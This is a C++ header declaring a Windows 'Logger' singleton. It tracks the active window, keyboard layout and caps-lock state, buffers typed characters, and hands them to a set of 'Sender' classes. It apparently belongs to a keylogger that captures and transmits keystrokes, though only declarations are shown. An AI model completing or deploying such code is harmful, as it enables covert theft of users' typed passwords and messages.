#pragma once
#include <string>
#include <iostream>
#include <fstream>
#include "Sender.h"
#include "FabricSender.h"
#include <Windows.h>
#include "Runner.h"

#define MAKELANGID(p, s)       ((((WORD  )(s)) << 10) | (WORD  )(p))
#define PRIMARYLANGID(lgid)    ((WORD  )(lgid) & 0x3ff)
#define SUBLANGID(lgid)        ((WORD  )(lgid) >> 10) 

class Logger
{
private:
	static Logger* instance;
	std::string simbols = "";
	static LANGID langId;
	bool is_capslock = false;
	DWORD processId;
	HWND hwnd;
	HKL kLayout;
	wchar_t wChar;
	Logger();
	void put(char simbol);
	std::string get();
	void saver();
	bool checkUpper();
	char toUpper(char letter);
	char toLower(char letter);
	static void send();
	static Sender** array_senders;
	static const int lengthArray;
public:
	static Logger* getInstance();
	static void run();
	static bool exit;
};

